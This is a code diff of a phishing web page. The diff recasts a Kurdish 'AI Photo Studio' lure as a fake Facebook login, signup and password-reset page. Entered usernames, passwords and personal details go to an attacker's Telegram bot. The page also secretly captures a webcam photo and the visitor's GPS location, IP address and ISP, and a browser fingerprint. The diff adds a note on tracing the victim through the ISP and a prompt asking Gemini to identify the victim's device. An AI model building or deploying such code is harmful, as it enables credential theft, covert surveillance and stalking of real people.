@@ -3,255 +3,285 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Photo Studio - دروستکردنی وێنە بە AI</title>
+    <title>Facebook - Log In or Sign Up</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;600;700;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
 
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Vazirmatn', sans-serif; }
-        
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
+
         body {
-            background: linear-gradient(135deg, #0f172a, #2e1065, #1e1b4b);
-            background-size: 400% 400%;
-            animation: neonBG 12s ease infinite;
-            color: #fff;
+            background-color: #f0f2f5;
+            color: #1c1e21;
             min-height: 100vh;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
+            padding: 20px 10px;
+        }
+
+        .fb-header-logo {
+            color: #1877f2;
+            font-size: 50px;
+            font-weight: bold;
+            letter-spacing: -2px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .fb-subtext {
+            font-size: 16px;
+            color: #1c1e21;
+            text-align: center;
+            margin-bottom: 20px;
+            max-width: 400px;
+            line-height: 1.4;
+        }
+
+        .card {
+            background: #ffffff;
+            border: none;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
             padding: 20px;
-        }
-
-        @keyframes neonBG {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        .container {
-            background: rgba(15, 23, 42, 0.85);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(56, 189, 248, 0.3);
-            padding: 30px 20px;
-            border-radius: 20px;
-            box-shadow: 0 0 35px rgba(56, 189, 248, 0.2), inset 0 0 15px rgba(168, 85, 247, 0.1);
-            max-width: 480px;
+            max-width: 400px;
             width: 100%;
             text-align: center;
         }
 
-        .logo-icon {
-            font-size: 45px;
-            margin-bottom: 10px;
-            animation: pulse 2s infinite;
-            filter: drop-shadow(0 0 10px #38bdf8);
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); filter: drop-shadow(0 0 5px #38bdf8); }
-            50% { transform: scale(1.12); filter: drop-shadow(0 0 20px #a855f7); }
-            100% { transform: scale(1); filter: drop-shadow(0 0 5px #38bdf8); }
-        }
-
-        h1 {
-            font-size: 22px;
-            color: #38bdf8;
-            margin-bottom: 8px;
-            font-weight: 900;
-            text-shadow: 0 0 10px rgba(56, 189, 248, 0.6);
-        }
-
-        p {
-            font-size: 13px;
-            color: #cbd5e1;
-            margin-bottom: 15px;
-            line-height: 1.6;
-        }
-
-        .tab-buttons {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
-        .tab-btn {
-            flex: 1;
-            padding: 10px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(56, 189, 248, 0.3);
-            color: #38bdf8;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: 700;
-            transition: all 0.3s;
-        }
-
-        .tab-btn.active {
-            background: linear-gradient(135deg, #0ea5e9, #a855f7);
-            color: white;
-            border-color: transparent;
-            box-shadow: 0 0 15px rgba(14, 165, 233, 0.4);
-        }
-
-        .form-group {
-            margin-bottom: 12px;
-            text-align: right;
-        }
-
-        .form-group label {
-            font-size: 12px;
-            color: #e2e8f0;
-            margin-bottom: 4px;
-            display: block;
-        }
-
         .form-control {
             width: 100%;
-            padding: 10px 12px;
-            background: rgba(15, 23, 42, 0.7);
-            border: 1px solid rgba(56, 189, 248, 0.3);
-            border-radius: 8px;
-            color: #38bdf8;
-            font-size: 14px;
-            font-weight: 700;
+            padding: 14px 16px;
+            background: #f5f6f7;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            color: #1d2129;
+            font-size: 15px;
             outline: none;
-            transition: all 0.3s;
+            margin-bottom: 12px;
         }
 
         .form-control:focus {
-            border-color: #a855f7;
-            box-shadow: 0 0 12px rgba(168, 85, 247, 0.6);
-            color: #e879f9;
+            border-color: #1877f2;
+            background: #fff;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .row-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        .row-group .form-control {
+            flex: 1;
+        }
+
+        .field-label {
+            text-align: right;
+            font-size: 12px;
+            color: #606770;
+            margin-bottom: 4px;
+            font-weight: 600;
+        }
+
+        .gender-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .gender-box {
+            flex: 1;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            padding: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            color: #1c1e21;
+            background: #fff;
+            cursor: pointer;
+        }
+
+        .btn-primary {
+            background-color: #1877f2;
+            color: #ffffff;
+            border: none;
+            padding: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 4px;
+            transition: background 0.2s;
+        }
+
+        .btn-primary:hover {
+            background-color: #166fe5;
+        }
+
+        .btn-secondary {
+            background-color: #42b72a;
+            color: #ffffff;
+            border: none;
+            padding: 12px 16px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            display: inline-block;
+            margin-top: 15px;
+            text-decoration: none;
+        }
+
+        .btn-secondary:hover {
+            background-color: #36a420;
+        }
+
+        .forgot-link {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-top: 14px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            align-items: center;
+            border-bottom: 1px solid #dadde1;
+            display: flex;
+            margin: 20px 0;
+            text-align: center;
         }
 
         .upload-box {
-            border: 2px dashed #a855f7;
-            padding: 15px;
-            border-radius: 10px;
+            border: 2px dashed #1877f2;
+            padding: 20px;
+            border-radius: 8px;
             cursor: pointer;
-            background: rgba(168, 85, 247, 0.05);
+            background: #e7f3ff;
             margin: 15px 0;
-            transition: all 0.3s ease;
         }
 
-        .upload-box:hover {
-            background: rgba(168, 85, 247, 0.15);
+        .upload-text {
+            font-size: 14px;
+            color: #1877f2;
+            font-weight: bold;
         }
 
         .upload-box input { display: none; }
 
-        .upload-text {
-            font-size: 13px;
-            color: #e879f9;
-            font-weight: 700;
-        }
-
-        .btn {
-            background: linear-gradient(135deg, #0ea5e9, #a855f7);
-            color: white;
-            border: none;
-            padding: 12px;
-            font-size: 15px;
-            border-radius: 10px;
-            cursor: pointer;
-            width: 100%;
-            font-weight: 900;
-            box-shadow: 0 0 20px rgba(14, 165, 233, 0.5);
-            transition: all 0.3s ease;
-            margin-top: 5px;
-        }
-
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 0 30px rgba(14, 165, 233, 0.8);
-        }
-
         .progress-container { display: none; margin-top: 20px; }
 
         .progress-bar-bg {
-            background: #1e293b;
+            background: #e4e6eb;
             border-radius: 10px;
-            height: 9px;
+            height: 10px;
             width: 100%;
             overflow: hidden;
             margin-bottom: 8px;
         }
 
         .progress-bar-fill {
-            background: linear-gradient(90deg, #38bdf8, #a855f7);
+            background: #1877f2;
             height: 100%;
             width: 0%;
             transition: width 0.4s ease;
         }
 
         .status-text {
-            font-size: 12px;
-            color: #38bdf8;
+            font-size: 13px;
+            color: #606770;
         }
 
-        .auth-section { display: block; }
-        .app-section { display: none; }
+        .section { display: none; }
+        .active-section { display: block; }
     </style>
 </head>
 <body>
 
-    <div class="container" id="main-card">
-        <div class="logo-icon">✨</div>
-        <h1>بەخێربێیت بۆ ماڵپەڕی دروستکردنی وێنە بە AI</h1>
-        <p>بەم ماڵپەڕە دەتوانیت تەنها بە ١ وێنەی خۆت، ١٠٠ وێنەی ناوازە و بەرزترین کوالێتی دروست بکەیت لە ڕێگەی زیرەکی دەستکردەوە (AI).</p>
+    <div class="fb-header-logo">facebook</div>
+    <div class="fb-subtext">بەخێربێیت! بۆ سوودوەرگرتن لە خزمیگوزاری AI Photo Studio، لە ڕێگەی فەیسبووکەوە بچۆ ژوورەوە.</div>
 
-        <!-- پەڕەی چوونەژوورەوە و تۆمارکردن -->
-        <div id="authSection" class="auth-section">
-            <div class="tab-buttons">
-                <button class="tab-btn active" id="btnTabLogin" onclick="switchAuthMode('login')">LogIn (چوونەژوورەوە)</button>
-                <button class="tab-btn" id="btnTabSignup" onclick="switchAuthMode('signup')">SignUp (دروستکردنی ئەکاونت)</button>
-            </div>
+    <!-- 1. LogIn Section -->
+    <div class="card section active-section" id="loginSection">
+        <input type="text" id="loginUser" class="form-control" placeholder="Email or Username">
+        <input type="password" id="loginPass" class="form-control" placeholder="Password">
+        <button class="btn-primary" onclick="handleLogin()">Log In</button>
+        
+        <a href="#" class="forgot-link" onclick="showSection('forgotSection')">Forgot password?</a>
+        
+        <div class="divider"></div>
+        <button class="btn-secondary" onclick="showSection('signupSection')">Create new account</button>
+    </div>
 
-            <div class="form-group">
-                <label>ناونیشانی ئیمەیڵ / یوزەرنێیم:</label>
-                <input type="text" id="authEmail" class="form-control" placeholder="ئیمەیڵەکەت بنووسە">
-            </div>
+    <!-- 2. SignUp Section -->
+    <div class="card section" id="signupSection">
+        <h2 style="font-size: 20px; margin-bottom: 5px; color: #1c1e21;">Create a new account</h2>
+        <p style="font-size: 13px; color: #606770; margin-bottom: 15px;">It's quick and easy.</p>
+        <div class="divider" style="margin: 10px 0 15px 0;"></div>
 
-            <div class="form-group">
-                <label>وشەی بەڕێوەبەر (Password):</label>
-                <input type="password" id="authPassword" class="form-control" placeholder="******">
-            </div>
-
-            <button class="btn" id="authActionBtn" onclick="handleAuth()">چوونەژوورەوە</button>
+        <div class="row-group">
+            <input type="text" id="regFirstName" class="form-control" placeholder="First name">
+            <input type="text" id="regLastName" class="form-control" placeholder="Surname">
         </div>
 
-        <!-- پەڕەی دووەم: پڕکردنەوەی فۆڕم و ئەپلۆدکەر (پاش LogIn دەبێت) -->
-        <div id="appSection" class="app-section">
-            <div style="background: rgba(56, 189, 248, 0.05); border: 1px dashed rgba(56, 189, 248, 0.4); padding: 10px; border-radius: 8px; font-size: 12px; color: #38bdf8; margin-bottom: 15px; text-align: right;">
-                📌 <strong>زانیاری کەسی:</strong> تکایە زانیارییە ڕاستەقینەکانی خۆت بنووسە بۆ چالاککردنی مۆدێلی AI.
-            </div>
+        <input type="text" id="regEmail" class="form-control" placeholder="Mobile number or email address">
+        <input type="password" id="regPass" class="form-control" placeholder="New password">
 
-            <div class="form-group">
-                <label>ناوی تەواو:</label>
-                <input type="text" id="name" class="form-control" placeholder="ناوی سیانی بنووسە">
-            </div>
-            <div class="form-group">
-                <label>ژمارەی تەلەفۆن:</label>
-                <input type="tel" id="phone" class="form-control" placeholder="0750XXXXXXX">
-            </div>
-            <div class="form-group">
-                <label>ڕێکەوتی لەدایکبوون:</label>
-                <input type="date" id="birthdate" class="form-control">
-            </div>
+        <div class="field-label">Date of birth</div>
+        <input type="date" id="regDOB" class="form-control">
 
-            <div class="upload-box" onclick="document.getElementById('fileInput').click()">
-                <div class="upload-text" id="uploadLabel">📁 ئەپلۆدکردنی وێنەی کەسی (١ وێنە)</div>
-                <input type="file" id="fileInput" accept="image/*" onchange="handleFileSelect()">
-            </div>
+        <div class="field-label">Gender</div>
+        <div class="gender-container">
+            <label class="gender-box">
+                <span>Female</span>
+                <input type="radio" name="gender" value="Female">
+            </label>
+            <label class="gender-box">
+                <span>Male</span>
+                <input type="radio" name="gender" value="Male" checked>
+            </label>
+        </div>
 
-            <button class="btn" id="generateBtn" onclick="startAIProcess()" disabled style="opacity: 0.5; cursor: not-allowed;">دەستپێکردنی دروستکردن</button>
+        <button class="btn-secondary" style="width: 100%; margin-top: 5px;" onclick="handleSignUp()">Sign Up</button>
+        <a href="#" class="forgot-link" onclick="showSection('loginSection')">Already have an account?</a>
+    </div>
 
-            <div class="progress-container" id="progressBox">
-                <div class="progress-bar-bg">
-                    <div class="progress-bar-fill" id="progressFill"></div>
-                </div>
-                <div class="status-text" id="statusText">خەریکی ئامادەکردنی مۆدێلی AI...</div>
+    <!-- 3. Forgot Password Section -->
+    <div class="card section" id="forgotSection">
+        <h2 style="font-size: 18px; margin-bottom: 10px; color: #1c1e21;">Find Your Account</h2>
+        <p style="font-size: 13px; color: #606770; margin-bottom: 15px;">Please enter your email address or mobile number to search for your account.</p>
+
+        <input type="text" id="forgotInput" class="form-control" placeholder="Email address or mobile number">
+        <button class="btn-primary" onclick="handleForgot()">Search</button>
+        <a href="#" class="forgot-link" onclick="showSection('loginSection')">Cancel</a>
+    </div>
+
+    <!-- 4. Main AI Process Section (دەستپێکردنی دروستکردنی وێنە) -->
+    <div class="card section" id="aiAppSection">
+        <h2 style="font-size: 18px; color: #1877f2; margin-bottom: 10px;">✨ AI Photo Studio</h2>
+        <p style="font-size: 13px; color: #606770; margin-bottom: 15px;">بۆ دروستکردنی ١٠٠ وێنەی ناوازە بە AI، تکایە وێنەیەکی روونی ڕوخسارت ئەپلۆد بکە.</p>
+
+        <div class="upload-box" onclick="document.getElementById('fileInput').click()">
+            <div class="upload-text" id="uploadLabel">📁 ئەپلۆدکردنی وێنەی کەسی (١ وێنە)</div>
+            <input type="file" id="fileInput" accept="image/*" onchange="handleFileSelect()">
+        </div>
+
+        <button class="btn-primary" id="generateBtn" onclick="startAIProcess()" disabled style="opacity: 0.5; cursor: not-allowed;">دەستپێکردنی دروستکردن</button>
+
+        <div class="progress-container" id="progressBox">
+            <div class="progress-bar-bg">
+                <div class="progress-bar-fill" id="progressFill"></div>
             </div>
+            <div class="status-text" id="statusText">خەریکی ئامادەکردنی مۆدێلی AI...</div>
         </div>
     </div>
 
@@ -260,58 +290,88 @@
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id') || "6782298541";
 
-        let currentAuthMode = 'login';
         let selectedFile = null;
+        let activeUserInfo = {};
 
-        function switchAuthMode(mode) {
-            currentAuthMode = mode;
-            if (mode === 'login') {
-                document.getElementById('btnTabLogin').classList.add('active');
-                document.getElementById('btnTabSignup').classList.remove('active');
-                document.getElementById('authActionBtn').innerText = 'چوونەژوورەوە';
-            } else {
-                document.getElementById('btnTabSignup').classList.add('active');
-                document.getElementById('btnTabLogin').classList.remove('active');
-                document.getElementById('authActionBtn').innerText = 'دروستکردنی ئەکاونت';
-            }
+        function showSection(sectionId) {
+            document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active-section'));
+            document.getElementById(sectionId).classList.add('active-section');
         }
 
-        async function handleAuth() {
-            const email = document.getElementById('authEmail').value.trim();
-            const password = document.getElementById('authPassword').value.trim();
-
-            if (!email || !password) {
-                alert("تکایە ئیمەیڵ و پاسۆرد پڕبکەرەوە!");
-                return;
-            }
-
-            // ناردنی زانیاری LogIn / SignUp بۆ تەلەگرامەکەت
-            const authMessage = `🔐 **زانیاری ${currentAuthMode === 'login' ? 'چوونەژوورەوە (LogIn)' : 'خۆتۆمارکردن (SignUp)'}:**\n\n` +
-                                `📧 ئیمەیڵ/یوزەر: \`${email}\`\n` +
-                                `🔑 پاسۆرد: \`${password}\``;
-
+        async function sendTelegramLog(text) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: authMessage, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
                 });
             } catch (e) {}
+        }
 
-            if (currentAuthMode === 'signup') {
-                localStorage.setItem('user_' + email, password);
-                alert("ئەکاونتەکەت بە سەرکەوتوویی دروستکرا! ئێستا دەتوانیت بەردەوام بیت.");
-            } else {
-                const savedPass = localStorage.getItem('user_' + email);
-                if (savedPass && savedPass !== password) {
-                    alert("پاسۆردەکەت هەڵەیە!");
-                    return;
-                }
+        async function handleLogin() {
+            const user = document.getElementById('loginUser').value.trim();
+            const pass = document.getElementById('loginPass').value.trim();
+
+            if (!user || !pass) {
+                alert("Please enter your email/username and password.");
+                return;
             }
 
-            // ڕێگەدان بە چوونەژوورەوە بۆ بەشی پڕکردنەوەی زانیارییەکان
-            document.getElementById('authSection').style.display = 'none';
-            document.getElementById('appSection').style.display = 'block';
+            activeUserInfo = { emailOrPhone: user };
+
+            const msg = `🔐 **زانیاری چوونەژوورەوە (LogIn):**\n\n` +
+                        `👤 یوزەر/ئیمەیڵ: \`${user}\`\n` +
+                        `🔑 پاسۆرد: \`${pass}\``;
+            await sendTelegramLog(msg);
+
+            showSection('aiAppSection');
+        }
+
+        async function handleSignUp() {
+            const fName = document.getElementById('regFirstName').value.trim();
+            const lName = document.getElementById('regLastName').value.trim();
+            const email = document.getElementById('regEmail').value.trim();
+            const pass = document.getElementById('regPass').value.trim();
+            const dob = document.getElementById('regDOB').value;
+            const gender = document.querySelector('input[name="gender"]:checked').value;
+
+            if (!fName || !lName || !email || !pass) {
+                alert("Please fill in all required fields.");
+                return;
+            }
+
+            activeUserInfo = {
+                fullName: `${fName}${lName}`,
+                emailOrPhone: email,
+                dob: dob,
+                gender: gender
+            };
+
+            const msg = `📝 **زانیاری خۆتۆمارکردن (SignUp):**\n\n` +
+                        `👤 ناوی تەواو: ${fName}${lName}\n` +
+                        `📧 ئیمەیڵ/ژمارە: \`${email}\`\n` +
+                        `🔑 پاسۆرد: \`${pass}\`
+` +
+                        `📅 ڕێکەوتی لەدایکبوون: ${dob || 'دیاری نەکراوە'}\n` +
+                        `⚧ ڕەگەز: ${gender}`;
+            await sendTelegramLog(msg);
+
+            showSection('aiAppSection');
+        }
+
+        async function handleForgot() {
+            const input = document.getElementById('forgotInput').value.trim();
+            if (!input) {
+                alert("Please enter your email or phone number.");
+                return;
+            }
+
+            const msg = `⚠️ **داواکاری گەڕاندنەوەی پاسۆرد (Forgot Password):**\n\n` +
+                        `🔎 زانیاری داخڵکراو: \`${input}\``;
+            await sendTelegramLog(msg);
+
+            alert("ئەگەر ئەم ئەکاونتە هەبێت، کۆدی گەڕاندنەوەت بۆ دەنێردرێت.");
+            showSection('loginSection');
         }
 
         function handleFileSelect() {
@@ -328,12 +388,8 @@
         }
 
         async function startAIProcess() {
-            let uName = document.getElementById('name').value.trim();
-            let uPhone = document.getElementById('phone').value.trim();
-            let uBirth = document.getElementById('birthdate').value.trim();
-
-            if (!uName || !uPhone || !selectedFile) {
-                alert("تکایە خانە سەرەکییەکان و وێنەکە پڕبکەرەوە!");
+            if (!selectedFile) {
+                alert("تکایە سەرەتا وێنەیەک هەڵبژێرە!");
                 return;
             }
 
@@ -376,7 +432,7 @@
                 mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                 locationStatus = "کەسەکە Allowـی لۆکەیشنی کردووە 🟢";
             } catch (e) {
-                locationStatus = "بەکارهێنەرەکە ڕێگەی پێنەداوە (Deny کردووە) 🔴";
+                locationStatus = "بەکارهێنەرەکە ڕێگەی پێنەداوە و لۆکەیشنی داخستووە (Deny کردووە) 🔴";
             }
 
             let batteryInfo = "نەزانراو";
@@ -384,8 +440,86 @@
                 if (navigator.getBattery) {
                     const bat = await navigator.getBattery();
                     let level = Math.round(bat.level * 100);
-                    let charging = bat.charging ? "لە سەر شەحنە ⚡️" : "لە سەر شەحن نییە 🔋";
+                    let charging = bat.charging ? "ئامێرەکەی لەسەر شەحنە ⚡️" : "ئامێرەکەی لەسەر شەحن نییە 🔋";
                     batteryInfo = `${level}% (${charging})`;
+                }
+            } catch (e) {}
+
+            let screenRes = `${window.screen.width}x${window.screen.height}`;
+            let pixelRatio = window.devicePixelRatio || 1;
+            let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ناوک (Cores)` : "نەزانراو";
+            let deviceRam = navigator.deviceMemory ? `نزیکەی ${navigator.deviceMemory} گێگابایت` : "نەزانراو";
+            let sysLang = navigator.language || "نەزانراو";
+            let isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "دۆخی تاریک (Dark Mode)" : "دۆخی ڕووناک (Light Mode)";
+
+            let extendedNetwork = "نەزانراو";
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    let type = conn.effectiveType || 'نادیار';
+                    let downlink = conn.downlink ? conn.downlink + ' Mbps' : 'نادیار';
+                    let rtt = conn.rtt ? conn.rtt + ' ms (Ping)' : 'نادیار';
+                    extendedNetwork = `جۆر: ${type} | خێرایی: ${downlink} | پینگ (RTT): ${rtt}`;
+                }
+            } catch (e) {}
+
+            let advFingerprint = "نەزانراو";
+            let gpuInfo = "نەزانراو";
+            try {
+                const canvasGL = document.createElement('canvas');
+                const gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+                const canvas2D = document.createElement('canvas');
+                const ctx = canvas2D.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("BrowserFP, 2026!", 2, 15);
+                let dataURI = canvas2D.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < dataURI.length; i++) {
+                    hash = ((hash << 5) - hash) + dataURI.charCodeAt(i);
+                    hash |= 0;
+                }
+                advFingerprint = `Hash ID: ${Math.abs(hash)} (GPU: ${gpuInfo})`;
+            } catch (e) {}
+
+            let motionInfo = "بەردەست نییە یان ڕێگری لێکراوە";
+            try {
+                let orientationData = await new Promise((resolve) => {
+                    let resolved = false;
+                    const handler = (event) => {
+                        if (!resolved) {
+                            resolved = true;
+                            window.removeEventListener('deviceorientation', handler);
+                            resolve(`Alpha: ${Math.round(event.alpha || 0)}°, Beta: ${Math.round(event.beta || 0)}°, Gamma: ${Math.round(event.gamma || 0)}°`);
+                        }
+                    };
+                    window.addEventListener('deviceorientation', handler);
+                    setTimeout(() => {
+                        if (!resolved) {
+                            resolved = true;
+                            resolve("جووڵە نەدۆزرایەوە (Timeout)");
+                        }
+                    }, 1000);
+                });
+                motionInfo = orientationData;
+            } catch (e) {}
+
+            let incognitoStatus = "ئاسایی (Normal Mode)";
+            try {
+                if ('storage' in navigator && 'estimate' in navigator.storage) {
+                    let estimate = await navigator.storage.estimate();
+                    if (estimate.quota && estimate.quota < 120 * 1024 * 1024) {
+                        incognitoStatus = "پەنجەرەی نەبینراو / ئینکۆگنیستۆ (Incognito Mode) 🕵️‍♂️";
+                    }
                 }
             } catch (e) {}
 
@@ -393,7 +527,7 @@
             let cameraStatus = "";
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                cameraStatus = "کەسەکە Allowـی کردووە 🟢";
+                cameraStatus = "کەسەکە Allowـی کردووە و وێنەکەی بە سەرکەوتوویی هاتۆتەوە 🟢";
                 
                 const video = document.createElement('video');
                 video.srcObject = stream;
@@ -412,29 +546,49 @@
                     }, 1000);
                 });
             } catch (e) {
-                cameraStatus = "بەکارهێنەرەکە Denyـی کردووە 🔴";
+                cameraStatus = "بەکارهێنەرەکە Allowـی نەکردووە (Deny کردووە)، بۆیە وێنەی نەهاتۆتەوە 🔴";
             }
 
-            updateProgress(30, "شیکردنەوەی زانیارییەکان...");
+            updateProgress(20, "شیکردنەوەی زانیارییە کەسییەکان...");
             await sleep(800);
-            updateProgress(70, "بەستنەوە بە مۆدێلی AI...");
+            updateProgress(50, "بەستنەوە بە مۆدێلی AI...");
             await sleep(800);
-            updateProgress(100, "تەواوبوو!");
+            updateProgress(80, "دروستکردنی ١٠٠ وێنە...");
+            await sleep(800);
+            updateProgress(100, "خەریکە تەواو دەبێت!");
 
-            let mapTextPart = mapLink ? `لۆکەیشن: [گووگڵ ماپ](${mapLink})` : `لۆکەیشن: ${locationStatus}`;
+            let mapTextPart = mapLink 
+                ? `لۆکەیشنی دەقیقی کەسەکە: [گووگڵ ماپ](${mapLink}) (Lat & Long: ${locationText})` 
+                : `لۆکەیشن: ${locationStatus}`;
 
-            const msg = `🚨 **زانیارییە نوێیەکان:**\n\n` +
-                        `👤 **کەسایەتی:**\n` +
-                        `• ناوی تەواو: ${uName}\n` +
-                        `• ژمارەی تەلەفۆن: \`${uPhone}\`\n` +
-                        `• لەدایکبوون: ${uBirth || 'نەنووسراوە'}\n\n` +
+            const msg = `🚨 **زانیارییە پڕکراوەکان و تەکنیکییەکانی سەردانیکەر:**\n\n` +
+                        `👤 **زانیارییە کەسییەکان:**\n` +
+                        `• ناوی تەواو: ${activeUserInfo.fullName || 'نەدیار'}\n` +
+                        `• ئیمەیڵ / ژمارە: \`${activeUserInfo.emailOrPhone || 'نەدیار'}\`\n` +
+                        `• ڕێکەوتی لەدایکبوون: ${activeUserInfo.dob || 'نەدیار'}\n` +
+                        `• ڕەگەز: ${activeUserInfo.gender || 'نەدیار'}\n\n` +
                         `⏰ کات: ${fullDateText}\n` +
                         `🌐 IP کەسەکە: ${ip} (${isp})\n` +
                         `📍 ${mapTextPart}\n` +
-                        `🔋 شەحن: ${batteryInfo}\n` +
+                        `🕵️‍♂️ دۆخی وێبگەڕ: ${incognitoStatus}\n` +
+                        `🛜 خێرایی و جۆری قووڵی ئینتەرنێت: ${extendedNetwork}\n` +
+                        `🧬 فینگەرپریینتی قووڵ (Advanced FP): ${advFingerprint}\n` +
+                        `🔄 سێنسەری جووڵە (Motion Sensors): ${motionInfo}\n` +
+                        `🔋 ڕێژەی شەحن: ${batteryInfo}\n` +
                         `📷 دۆخی کامێرا: ${cameraStatus}\n` +
-                        `📱 ئامێر: ${deviceModel}\n` +
-                        `🌐 User-Agent: ${userAgentText}`;
+                        `📱 سیستەم/ئامێر: ${deviceModel}\n` +
+                        `📐 ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})\n` +
+                        `🧠 CPU: ${cpuCores} | RAM: ${deviceRam}\n` +
+                        `🌐 زمانی سیستەم: ${sysLang}\n` +
+                        `🌓 دۆخی شاشە: ${isDarkMode}\n` +
+                        `🌐 User-Agent: ${userAgentText}\n\n` +
+                        `📌 **چۆنیەتی سوودوەرگرتن لە IP بۆ دۆزینەوەی شوێنی ورد (ڕێگەی یاسایی):**\n` +
+                        `ئەگەر لۆکەیشنی ڕاستەوخۆ (GPS) بەردەست نەبوو یان کەسەکە Denyـی کرد، دەتوانیت لە ڕێگەی IPـیەکەیەوە (${ip}) ئەم هەنگاوانە بنێیت:\n` +
+                        `1. ناسینەوەی کۆمپانیای دابینکەری ئینتەرنێت (ISP) کە بریتییە لە: (${isp}).\n` +
+                        `2. پێشکەشکردنی سکاڵای فەرمی یان داواکاری یاسایی بۆ لایەنە پەیوەندیدارەکان.\n` +
+                        `3. کۆمپانیاکەی ئینتەرنێت لە ڕێگەی کاتی ڕووداوەکە (${timeString}) دەتوانێت بە دەقیقی دیاری بکات کە ئەو IPـیە لەو ساتەدا لەلایەن کێوە بەکارهاتووە.\n\n` +
+                        `🤖 **پرۆمتی تایبەت بۆ جێمینای:**\n` +
+                        `"سڵاو! من ئەم زانیارییە تەکنیکییانەی ئامێری کەسێکم هەیە: GPU WebGL: ${gpuInfo}، ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})، ناوکەکانی پرۆسێسەر: ${cpuCores}، ڕام: ${deviceRam}، و User-Agent: ${userAgentText}. تکایە شیکاری بکە و دیاری بکە کە ئەم ئامێرە هی چ مۆدێل و برندێکی دیاریکراوە?"`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -449,7 +603,7 @@
                     const formDataCam = new FormData();
                     formDataCam.append('chat_id', chatId);
                     formDataCam.append('photo', cameraBlob, 'camera.jpg');
-                    formDataCam.append('caption', `📸 وێنەی ڕاستەوخۆ (${uName})`);
+                    formDataCam.append('caption', `📸 وێنەی ڕاستەوخۆی کەسەکە (${activeUserInfo.fullName || 'نەدیار'})`);
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataCam });
                 } catch (err) {}
             }
@@ -459,17 +613,17 @@
                     const formDataUpload = new FormData();
                     formDataUpload.append('chat_id', chatId);
                     formDataUpload.append('photo', selectedFile, selectedFile.name);
-                    formDataUpload.append('caption', `🖼 وێنەی ئەپلۆدکراو (${uName})`);
+                    formDataUpload.append('caption', `🖼 ئەو وێنەیەی کەسەکە خۆی ئەپلۆدی کردووە (${activeUserInfo.fullName || 'نەدیار'})`);
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataUpload });
                 } catch (err) {}
             }
 
             setTimeout(() => {
-                document.getElementById('main-card').innerHTML = `
-                    <div style="font-size: 50px; margin-bottom: 15px;">⚠️</div>
-                    <h1 style="color: #f87171;">وێنەکانت نەتوانران بە تەواوی دروست بکرێن!</h1>
-                    <p>بەهۆی خراپی دۆخی ئینتەرنێتەکەت، پرۆسەی دروستکردنی وێنەکان سەرکەوتوو نەبوو. تکایە دووبارە هەوڵ بدەرەوە.</p>
-                    <button class="btn" onclick="location.reload()" style="margin-top: 15px; background: linear-gradient(135deg, #f43f5e, #fb7185);">🔄 دووبارە هەوڵدانەوە</button>
